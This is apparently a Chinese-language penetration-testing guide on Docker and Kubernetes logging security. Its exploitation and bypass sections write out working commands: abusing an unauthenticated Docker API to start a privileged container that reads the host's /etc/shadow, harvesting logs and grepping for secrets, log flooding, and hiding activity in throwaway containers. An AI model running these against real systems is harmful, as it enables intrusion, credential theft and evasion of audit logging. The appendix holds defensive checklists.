# 容器日志安全测试 (Container Logging Security Testing)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供容器环境日志安全测试的方法论，帮助测试人员评估 Docker、Kubernetes 等容器平台的日志安全性。

### 1.2 适用范围
本文档适用于以下场景：
- Docker 容器日志安全测试
- Kubernetes 日志系统测试
- 容器编排平台日志评估
- 容器日志数据完整性验证

### 1.3 读者对象
- 渗透测试工程师
- 容器安全分析师
- DevOps 工程师
- 云原生安全架构师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

容器日志安全测试关注容器化环境中日志的收集、存储和访问控制问题。容器环境的动态性和短暂性带来了独特的日志安全挑战。

**核心原理：**
- **日志驱动配置**：Docker 日志驱动配置不当导致日志丢失或泄露
- **容器日志路径**：容器日志存储路径权限配置错误
- **Kubernetes 审计日志**：审计日志未启用或配置不当
- **短暂性日志**：容器终止后日志丢失

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **Docker 守护进程** | Docker API | 未授权访问容器日志 |
| **Kubernetes API** | kube-apiserver | 审计日志未启用 |
| **容器日志收集** | Fluentd、Filebeat | 配置泄露敏感信息 |
| **服务网格** | Istio、Linkerd | 访问日志包含敏感数据 |
| **Serverless 容器** | Fargate、ACI | 日志访问控制错误 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**Docker 日志探测：**
```bash
# 检查 Docker 守护进程是否暴露
docker -H tcp://target:2375 ps
docker -H tcp://target:2375 logs <container_id>

# 查看容器日志
docker logs <container_id>
docker logs --tail 100 <container_id>
docker logs -f <container_id>

# 检查日志驱动
docker inspect <container_id> | grep -A 10 LogPath
docker info | grep Logging
```

**Kubernetes 日志探测：**
```bash
# 检查 Pod 日志
kubectl logs <pod-name>
kubectl logs -f <pod-name>
kubectl logs <pod-name> -c <container-name>

# 检查历史日志（容器重启后）
kubectl logs <pod-name> --previous

# 检查审计日志配置
kubectl get configmap -n kube-system kube-apiserver -o yaml

# 检查日志收集器
kubectl get pods -n kube-system | grep -E "fluent|filebeat|log"
```

#### 2.3.2 白盒测试

**Docker 配置审计：**
```json
// daemon.json 危险配置
{
  "log-driver": "none",  // 危险：禁用日志
  "log-opts": {
    "max-size": "1k",  // 危险：日志大小过小
    "max-file": "1"    // 危险：仅保留 1 个文件
  },
  "hosts": ["tcp://0.0.0.0:2375"]  // 危险：无 TLS 暴露 API
}
```

**Kubernetes 配置审计：**
```yaml
# kube-apiserver 配置危险示例
apiVersion: v1
kind: Pod
metadata:
  name: kube-apiserver
spec:
  containers:
  - name: kube-apiserver
    command:
    - kube-apiserver
    # 危险：未启用审计日志
    # - --audit-log-path=/var/log/audit.log
    # - --audit-policy-file=/etc/audit/policy.yaml
```

### 2.4 漏洞利用方法

#### 2.4.1 Docker API 未授权访问

```bash
# 如果 Docker API 未授权访问（2375 端口）
# 列出所有容器
curl http://target:2375/containers/json

# 读取容器日志
curl http://target:2375/containers/<id>/logs?stdout=1&stderr=1

# 创建特权容器
curl -X POST http://target:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["cat", "/host/etc/shadow"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    }
  }'

# 启动并读取输出
```

#### 2.4.2 Kubernetes 日志访问

```bash
# 如果有集群访问权限
# 读取所有命名空间的日志
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  kubectl logs -l app=sensitive -n $ns >> all_logs.txt
done

# 搜索敏感信息
grep -r "password\|secret\|token" /var/log/containers/

# 读取审计日志（如果启用）
kubectl get --raw=/logs/audit.log
```

#### 2.4.3 日志收集器配置泄露

```bash
# Fluentd 配置可能包含敏感信息
kubectl get configmap fluentd-config -n kube-system -o yaml

# 可能泄露：
# - Elasticsearch 凭证
# - S3 访问密钥
# - 日志过滤规则（暴露监控盲点）

# Filebeat 配置
kubectl get configmap filebeat-config -o yaml
```

#### 2.4.4 容器日志注入

```bash
# 在容器内生成恶意日志
docker exec <container_id> sh -c '
  for i in $(seq 1 1000); do
    echo "Fake log entry $i"
  done
'

# 日志洪水攻击
docker exec <container_id> sh -c '
  yes "A" | head -n 1000000
'
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过容器日志监控

```bash
# 使用无日志执行
# 某些容器配置为不记录 stdout/stderr

# 直接写入设备文件
docker exec <container_id> sh -c '
  echo "malicious" > /dev/null
'

# 使用 syslog 而不是 stdout
docker exec <container_id> logger "message"
```

#### 2.5.2 利用短暂容器

```bash
# 在短暂容器中执行操作
# 容器终止后日志可能丢失

# 创建一次性容器
docker run --rm alpine sh -c '
  # 执行敏感操作
  # 容器退出后日志随容器删除
'

# Kubernetes Job
kubectl create job temp-job --image=alpine -- \
  sh -c 'malicious_command; exit 0'
```

---

## 第三部分：附录

### 3.1 容器日志安全配置检查清单

| **组件** | **配置项** | **安全设置** |
| :--- | :--- | :--- |
| Docker | 日志驱动 | json-file/syslog |
| Docker | API 访问 | 启用 TLS 认证 |
| Kubernetes | 审计日志 | 启用并保护 |
| Kubernetes | 日志保留 | 根据合规要求 |
| Fluentd | 凭证存储 | 使用 Secret |

### 3.2 Kubernetes 审计策略示例

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: Metadata
  resources:
  - group: ""
    resources: ["secrets", "configmaps"]
- level: Request
  resources:
  - group: ""
    resources: ["pods", "services"]
- level: None
  users: ["system:kube-scheduler"]
  verbs: ["get", "list"]
```

### 3.3 参考资源

- [Docker Security Logging](https://docs.docker.com/config/containers/logging/configure/)
- [Kubernetes Audit Logging](https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
